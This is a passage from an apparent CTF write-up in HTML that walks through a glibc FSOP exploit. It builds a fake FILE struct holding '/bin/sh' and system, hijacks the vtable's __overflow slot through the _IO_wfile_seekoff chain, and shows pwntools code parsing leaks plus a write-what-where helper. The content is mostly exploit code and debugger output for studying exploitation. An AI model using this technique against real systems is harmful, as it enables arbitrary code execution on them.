style="--0:#6F42C1;--1:#B392F0">JUMP_FIELD</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">_IO_doallocate_t</span><span style="--0:#24292E;--1:#E1E4E8">, __doallocate);</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">18</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">JUMP_FIELD</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">_IO_read_t</span><span style="--0:#24292E;--1:#E1E4E8">, __read);</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">19</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">JUMP_FIELD</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">_IO_write_t</span><span style="--0:#24292E;--1:#E1E4E8">, __write);</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">20</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">JUMP_FIELD</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">_IO_seek_t</span><span style="--0:#24292E;--1:#E1E4E8">, __seek);</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">21</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">JUMP_FIELD</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">_IO_close_t</span><span style="--0:#24292E;--1:#E1E4E8">, __close);</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">22</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">JUMP_FIELD</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">_IO_stat_t</span><span style="--0:#24292E;--1:#E1E4E8">, __stat);</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">23</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">JUMP_FIELD</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">_IO_showmanyc_t</span><span style="--0:#24292E;--1:#E1E4E8">, __showmanyc);</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">24</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">JUMP_FIELD</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">_IO_imbue_t</span><span style="--0:#24292E;--1:#E1E4E8">, __imbue);</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">25</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">};</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="struct _IO_jump_t{    JUMP_FIELD(size_t, __dummy);    JUMP_FIELD(size_t, __dummy2);    JUMP_FIELD(_IO_finish_t, __finish);    JUMP_FIELD(_IO_overflow_t, __overflow);    JUMP_FIELD(_IO_underflow_t, __underflow);    JUMP_FIELD(_IO_underflow_t, __uflow);    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);    /* showmany */    JUMP_FIELD(_IO_xsputn_t, __xsputn);    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);    JUMP_FIELD(_IO_seekoff_t, __seekoff);    JUMP_FIELD(_IO_seekpos_t, __seekpos);    JUMP_FIELD(_IO_setbuf_t, __setbuf);    JUMP_FIELD(_IO_sync_t, __sync);    JUMP_FIELD(_IO_doallocate_t, __doallocate);    JUMP_FIELD(_IO_read_t, __read);    JUMP_FIELD(_IO_write_t, __write);    JUMP_FIELD(_IO_seek_t, __seek);    JUMP_FIELD(_IO_close_t, __close);    JUMP_FIELD(_IO_stat_t, __stat);    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);    JUMP_FIELD(_IO_imbue_t, __imbue);};"><div></div></button></div></figure></div>
<blockquote>
<p><a href="https://elixir.bootlin.com/glibc/glibc-2.39/source/libio/libioP.h#L294" rel="nofollow noreferrer noopener" target="_blank">https://elixir.bootlin.com/glibc/glibc-2.39/source/libio/libioP.h#L294</a></p>
</blockquote>
<p>So, the function that the <code>_IO_switch_to_wget_mode</code> is calling is <code>__overflow</code> and thus the 0x18 offset!</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="plaintext" class="wrap" style="--ecMaxLine:34ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">0x00: __dummy</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">0x08: __dummy2</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">0x10: __finish</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">0x18: __overflow ← WE HIJACK THIS!</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">0x20: __underflow</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="0x00: __dummy0x08: __dummy20x10: __finish0x18: __overflow ← WE HIJACK THIS!0x20: __underflow"><div></div></button></div></figure></div>
<h3 id="planting-the-seed--what-where--why">Planting the Seed — What, Where &amp; Why?</h3>
<p>Now, that we fully understand what file structs are and how we can exploit them using the <code>_IO_wfile_seekoff</code> chain let’s move on to the part where we write the exploitation script. The basic concept is that we place a crafted file struct in the <code>.bss</code> section and overwrite the <code>_IO_list_all</code> to point to the crafted file struct so, when <code>_IO_flush_all</code> is called the top of the list is our crafted file struct and exploit get’s triggered and we get the shell.</p>
<p>Now this is the file structure that we are gonna be writing to the memory:</p>
<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="bash" class="wrap" style="--ecMaxLine:69ch"><code><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">fs[0x00]</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&quot;/bin/sh&quot;</span><span style="--0:#24292E;--1:#E1E4E8">                    ; </span><span style="--0:#6F42C1;--1:#B392F0">_flags</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">fs[0x18]</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">system</span><span style="--0:#24292E;--1:#E1E4E8">                       ; </span><span style="--0:#6F42C1;--1:#B392F0">_IO_read_base</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">fs[0x88]</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">_IO_stdfile_2_lock</span><span style="--0:#24292E;--1:#E1E4E8">           ; </span><span style="--0:#6F42C1;--1:#B392F0">_lock</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">fs[0xa0]</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">_wide_data</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">ptr</span><span style="--0:#24292E;--1:#E1E4E8">               ; </span><span style="--0:#6F42C1;--1:#B392F0">fp-0x20</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">fs[0xc0]</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">ptr</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">to</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">fake</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">file</span><span style="--0:#24292E;--1:#E1E4E8">             ; </span><span style="--0:#6F42C1;--1:#B392F0">fp</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">fs[0xd8]</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">vtable</span><span style="--0:#24292E;--1:#E1E4E8">                       ; (</span><span style="--0:#6F42C1;--1:#B392F0">_IO_wfile_jumps+0x48</span><span style="--0:#24292E;--1:#E1E4E8">)</span><span style="--0:#6F42C1;--1:#B392F0">-0x18</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span style="--0:#BF3441;--1:#F97583">&gt;</span><span style="--0:#24292E;--1:#E1E4E8"> the rest of the contents are set to 0x00</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="fs[0x00] = &#34;/bin/sh&#34;                    ; _flagsfs[0x18] = system                       ; _IO_read_basefs[0x88] = _IO_stdfile_2_lock           ; _lockfs[0xa0] = _wide_data ptr               ; fp-0x20fs[0xc0] = ptr to fake file             ; fpfs[0xd8] = vtable                       ; (_IO_wfile_jumps+0x48)-0x18> the rest of the contents are set to 0x00"><div></div></button></div></figure></div>
<p>Lemme explain why? So, when <code>_IO_flush_all</code> is moves into rax the <code>vtable</code> which is present at <code>0xd8</code> offset and then adds <code>0x18</code> to the value of <code>rax</code> and then dereferences it before calling it.</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="plaintext" class="wrap" style="--ecMaxLine:63ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">pwndbg&gt; disas _IO_flush_all</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">Dump of assembler code for function __GI__IO_flush_all:</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">...SNIP...</span></div></div><div class="ec-line" style="--ecIndent:3ch"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span class="indent"><span style="--0:#24292e;--1:#e1e4e8">   </span></span><span style="--0:#24292e;--1:#e1e4e8">0x00007ffff7c961c1 &lt;+193&gt;:   mov    rax,QWORD PTR [rbx+0xd8]</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">...SNIP...</span></div></div><div class="ec-line" style="--ecIndent:3ch"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code"><span class="indent"><span style="--0:#24292e;--1:#e1e4e8">   </span></span><span style="--0:#24292e;--1:#e1e4e8">0x00007ffff7c961e3 &lt;+227&gt;:   call   QWORD PTR [rax+0x18]</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">...SNIP...</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="pwndbg> disas _IO_flush_allDump of assembler code for function __GI__IO_flush_all:...SNIP...   0x00007ffff7c961c1 <+193>:   mov    rax,QWORD PTR [rbx+0xd8]...SNIP...   0x00007ffff7c961e3 <+227>:   call   QWORD PTR [rax+0x18]...SNIP..."><div></div></button></div></figure></div>
<p>So, this tells us that our vtable is supposed to contain the address of the <code>_IO_wfile_seekoff</code> jump subtracted by <code>0x18</code>. Now, the <code>_IO_wfile_seekoff</code> jump is stored at <code>_IO_wfile_jumps+0x48</code>:</p>
<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="shell" class="wrap" style="--ecMaxLine:79ch"><code><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">pwndbg</span><span style="--0:#24292E;--1:#E1E4E8">&gt; </span><span style="--0:#032F62;--1:#9ECBFF">p</span><span style="--0:#24292E;--1:#E1E4E8"> &amp;</span><span style="--0:#6F42C1;--1:#B392F0">_IO_wfile_jumps</span></div></div><div class="ec-line"><div class="code"><span style="--0:#AE4B07;--1:#FFAB70">$7</span><span style="--0:#24292E;--1:#E1E4E8"> = (</span><span style="--0:#6F42C1;--1:#B392F0">&lt;data</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">variable,</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">no</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">debug</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">info&gt;</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">*</span><span style="--0:#24292E;--1:#E1E4E8">) 0x7fa156802228 &lt;_IO_wfile_jumps&gt;</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">pwndbg</span><span style="--0:#24292E;--1:#E1E4E8">&gt; </span><span style="--0:#032F62;--1:#9ECBFF">x/a</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">0x7fa156802228+0x48</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">0x7fa156802270</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&lt;_IO_wfile_jumps+72&gt;:</span><span style="--0:#24292E;--1:#E1E4E8">    </span><span style="--0:#005CC5;--1:#79B8FF">0x7fa15668d280</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&lt;__GI__IO_wfile_seekoff&gt;</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="pwndbg> p &#38;_IO_wfile_jumps$7 = (<data variable, no debug info> *) 0x7fa156802228 <_IO_wfile_jumps>pwndbg> x/a 0x7fa156802228+0x480x7fa156802270 <_IO_wfile_jumps+72>:    0x7fa15668d280 <__GI__IO_wfile_seekoff>"><div></div></button></div></figure></div>
<p>So, we place <code>(_IO_wfile_jumps+0x48)-0x18</code> to the vtable of our fake file struct. So,, <code>_IO_flush_all</code> calls the <code>_IO_wfile_seekoff</code> which in turn calls <code>_IO_switch_to_wget_mode</code>. <code>_IO_switch_to_wget_mode</code> moves <code>*(rdi+0xa0)</code> into <code>rax</code>. Now, <code>rdi+0xa0</code> is the <code>_wide_data</code> calls <code>rdi</code> is the starting of the fake file! It then moves <code>*(rax+0xe0)</code> where <code>rax</code> is the <code>_wide_data</code> which we set to <code>fp-0x20</code> so, <code>fp-0x20+0xe0 = 0xd0</code> where we have written the pointer to the file struct. It then calls <code>*(rax+0x18)</code> where rax is the file pointers so, what we are calling is <code>fp+0x18</code> where we have placed the system function address. Also, the <code>rdi</code> is still pointing to the start of the file struct so, the first argument to system is <code>fp</code> whose first 8-bytes are <code>/bin/sh\x00</code>.</p>
<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="bash" class="wrap" style="--ecMaxLine:63ch"><code><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">pwndbg</span><span style="--0:#24292E;--1:#E1E4E8">&gt; </span><span style="--0:#032F62;--1:#9ECBFF">disas</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">_IO_switch_to_wget_mode</span></div></div><div class="ec-line"><div class="code"><span style="--0:#005CC5;--1:#79B8FF">..</span><span style="--0:#032F62;--1:#9ECBFF">.SNIP.</span><span style="--0:#005CC5;--1:#79B8FF">..</span></div></div><div class="ec-line" style="--ecIndent:3ch"><div class="code"><span class="indent">   </span><span style="--0:#6F42C1;--1:#B392F0">0x00007ffff7c8afc0</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&lt;+16&gt;:</span><span style="--0:#24292E;--1:#E1E4E8">    </span><span style="--0:#032F62;--1:#9ECBFF">mov</span><span style="--0:#24292E;--1:#E1E4E8">    </span><span style="--0:#032F62;--1:#9ECBFF">rax,QWORD</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">PTR</span><span style="--0:#24292E;--1:#E1E4E8"> [rdi+0xa0]</span></div></div><div class="ec-line"><div class="code"><span style="--0:#005CC5;--1:#79B8FF">..</span><span style="--0:#032F62;--1:#9ECBFF">.SNIP.</span><span style="--0:#005CC5;--1:#79B8FF">..</span></div></div><div class="ec-line" style="--ecIndent:3ch"><div class="code"><span class="indent">   </span><span style="--0:#6F42C1;--1:#B392F0">0x00007ffff7c8afd1</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&lt;+33&gt;:</span><span style="--0:#24292E;--1:#E1E4E8">    </span><span style="--0:#032F62;--1:#9ECBFF">mov</span><span style="--0:#24292E;--1:#E1E4E8">    </span><span style="--0:#032F62;--1:#9ECBFF">rax,QWORD</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">PTR</span><span style="--0:#24292E;--1:#E1E4E8"> [rax+0xe0]</span></div></div><div class="ec-line" style="--ecIndent:3ch"><div class="code"><span class="indent">   </span><span style="--0:#6F42C1;--1:#B392F0">0x00007ffff7c8afdd</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&lt;+45&gt;:</span><span style="--0:#24292E;--1:#E1E4E8">    </span><span style="--0:#032F62;--1:#9ECBFF">call</span><span style="--0:#24292E;--1:#E1E4E8">   </span><span style="--0:#032F62;--1:#9ECBFF">QWORD</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">PTR</span><span style="--0:#24292E;--1:#E1E4E8"> [rax+0x18]</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="pwndbg> disas _IO_switch_to_wget_mode...SNIP...   0x00007ffff7c8afc0 <+16>:    mov    rax,QWORD PTR [rdi+0xa0]...SNIP...   0x00007ffff7c8afd1 <+33>:    mov    rax,QWORD PTR [rax+0xe0]   0x00007ffff7c8afdd <+45>:    call   QWORD PTR [rax+0x18]"><div></div></button></div></figure></div>
<h3 id="now-what--poc-time">Now What — PoC Time!</h3>
<p>Now that we understand exactly what memory layout we need, let’s use our write-what-where primitive to construct it piece by piece in the <code>.bss</code> section. First, we need to know where to build our fake structure and as the <code>mail_server_info()</code> function prints the address of <code>current_license</code> and the address of <code>exit()</code> function we have the leaks needed. We just need to parse them!</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="python" class="wrap" style="--ecMaxLine:87ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">io.recvuntil(</span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;0x&quot;</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">pieBase </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">int</span><span style="--0:#24292E;--1:#E1E4E8">(io.recvline().strip().decode()[:</span><span style="--0:#BF3441;--1:#F97583">-</span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">], </span><span style="--0:#005CC5;--1:#79B8FF">16</span><span style="--0:#24292E;--1:#E1E4E8">) </span><span style="--0:#BF3441;--1:#F97583">-</span><span style="--0:#24292E;--1:#E1E4E8"> exe.symbols[</span><span style="--0:#032F62;--1:#9ECBFF">&#39;current_license&#39;</span><span style="--0:#24292E;--1:#E1E4E8">]</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">io.recvuntil(</span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;0x&quot;</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">libc.address </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">int</span><span style="--0:#24292E;--1:#E1E4E8">(io.recvline().strip().decode()[:</span><span style="--0:#BF3441;--1:#F97583">-</span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">], </span><span style="--0:#005CC5;--1:#79B8FF">16</span><span style="--0:#24292E;--1:#E1E4E8">) </span><span style="--0:#BF3441;--1:#F97583">-</span><span style="--0:#24292E;--1:#E1E4E8"> libc.symbols[</span><span style="--0:#032F62;--1:#9ECBFF">&#39;exit&#39;</span><span style="--0:#24292E;--1:#E1E4E8">]</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="io.recvuntil(b&#34;0x&#34;)pieBase = int(io.recvline().strip().decode()[:-1], 16) - exe.symbols['current_license']io.recvuntil(b&#34;0x&#34;)libc.address = int(io.recvline().strip().decode()[:-1], 16) - libc.symbols['exit']"><div></div></button></div></figure></div>
<p>Now, that we have the <code>pieBase</code> and <code>libc.address</code> we just need to find a suitable location in the <code>.bss</code> section to write our file struct to.</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="plaintext" class="wrap" style="--ecMaxLine:54ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">pwndbg&gt; dq 0x555555554000+0x4210 28</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">0000555555558210     0000000000000000 0000000000000000</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">0000555555558220     0000000000000000 0000000000000000</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">0000555555558230     0000000000000000 0000000000000000</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">0000555555558240     0000000000000000 0000000000000000</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">0000555555558250     0000000000000000 0000000000000000</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">0000555555558260     0000000000000000 0000000000000000</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">0000555555558270     0000000000000000 0000000000000000</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">0000555555558280     0000000000000000 0000000000000000</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">10</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">0000555555558290     0000000000000000 0000000000000000</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">11</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">00005555555582a0     0000000000000000 0000000000000000</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">12</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">00005555555582b0     0000000000000000 0000000000000000</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">13</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">00005555555582c0     0000000000000000 0000000000000000</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">14</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">00005555555582d0     0000000000000000 0000000000000000</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">15</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">00005555555582e0     0000000000000000 0000000000000000</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="pwndbg> dq 0x555555554000+0x4210 280000555555558210     0000000000000000 00000000000000000000555555558220     0000000000000000 00000000000000000000555555558230     0000000000000000 00000000000000000000555555558240     0000000000000000 00000000000000000000555555558250     0000000000000000 00000000000000000000555555558260     0000000000000000 00000000000000000000555555558270     0000000000000000 00000000000000000000555555558280     0000000000000000 00000000000000000000555555558290     0000000000000000 000000000000000000005555555582a0     0000000000000000 000000000000000000005555555582b0     0000000000000000 000000000000000000005555555582c0     0000000000000000 000000000000000000005555555582d0     0000000000000000 000000000000000000005555555582e0     0000000000000000 0000000000000000"><div></div></button></div></figure></div>
<p>So, I wrote this helper function to facilitate in the write what where:</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="python" class="wrap" style="--ecMaxLine:49ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">def</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">write</span><span style="--0:#24292E;--1:#E1E4E8">(addr, data):</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">io.sendlineafter(</span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;&gt; &quot;</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;write&quot;</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">io.sendlineafter(</span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;: 0x&quot;</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#005CC5;--1:#79B8FF">hex</span><span style="--0:#24292E;--1:#E1E4E8">(addr).encode())</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">io.sendlineafter(</span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;(8 chars): &quot;</span><span style="--0:#24292E;--1:#E1E4E8">, data)</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">io.sendlineafter(</span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;(64 chars): &quot;</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;&quot;</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="def write(addr, data):    io.sendlineafter(b&#34;> &#34;, b&#34;write&#34;)    io.sendlineafter(b&#34;: 0x&#34;, hex(addr).encode())    io.sendlineafter(b&#34;(8 chars): &#34;, data)    io.sendlineafter(b&#34;(64 chars): &#34;, b&#34;&#34;)"><div></div></button></div></figure></div>
